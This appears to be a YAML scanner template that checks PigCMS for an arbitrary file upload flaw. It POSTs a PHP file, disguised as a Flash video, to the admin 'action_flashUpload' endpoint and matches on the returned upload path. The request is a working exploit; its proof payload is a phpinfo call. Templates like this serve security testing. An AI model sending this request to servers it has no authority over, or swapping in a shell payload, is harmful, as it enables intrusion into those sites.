id: PigCMS_action_flashUpload_upload
info:
  name: PigCMS_action_flashUpload_upload
  author: 小黑子
  severity: critical
  verified: true
  description: |
    app="PigCMS"

rules:
    r0:
        request:
            method: POST
            allow_redirects: False #是否302跳转 ，true：跳转 ，False：不跳转
            path: /cms/manage/admin.php?m=manage&c=background&a=action_flashUpload
            headers:
             Content-Type:
              multipart/form-data; boundary=----aaa
             User-Agent:
              Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)
            body: "\
             ------aaa\r\n\
             Content-Disposition: form-data; name=\"filePath\"; filename=\"test.php\"\r\n\
             Content-Type: video/x-flv\r\n\
             \r\n\
             <?php phpinfo();?>\r\n\
             ------aaa\r\n\
             "
        matcher: "\".php\" in res.text and \"upload/images\" in res.text"
